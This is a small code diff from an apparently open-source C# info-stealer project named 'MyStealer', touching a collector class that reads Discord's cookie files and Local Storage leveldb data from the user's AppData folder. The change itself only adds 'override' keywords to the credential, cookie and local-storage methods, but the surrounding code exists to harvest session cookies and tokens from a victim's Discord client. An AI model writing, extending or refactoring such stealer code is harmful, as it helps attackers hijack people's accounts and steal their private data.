@@ -12,9 +12,9 @@ namespace MyStealer.Collectors.Browser.ChromiumBased
 
         protected override string UserDataPath => Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Discord");
 
-        public ISet<CredentialEntry> GetCredentials() => new HashSet<CredentialEntry>(); // 'Login Data' file is not available
+        public override ISet<CredentialEntry> GetCredentials() => new HashSet<CredentialEntry>(); // 'Login Data' file is not available
 
-        public ISet<CookieEntry> GetCookies()
+        public override ISet<CookieEntry> GetCookies()
         {
             var set = new HashSet<CookieEntry>();
             foreach (var cookiePath in CookieFilePathList)
@@ -26,7 +26,7 @@ namespace MyStealer.Collectors.Browser.ChromiumBased
             return set;
         }
 
-        public ISet<LocalStorageEntry> GetLocalStorageEntries()
+        public override ISet<LocalStorageEntry> GetLocalStorageEntries()
         {
             var set = new HashSet<LocalStorageEntry>();
             foreach (var entry in ReadLocalStorage("master", Path.Combine(UserDataPath, "Local Storage", "leveldb")))
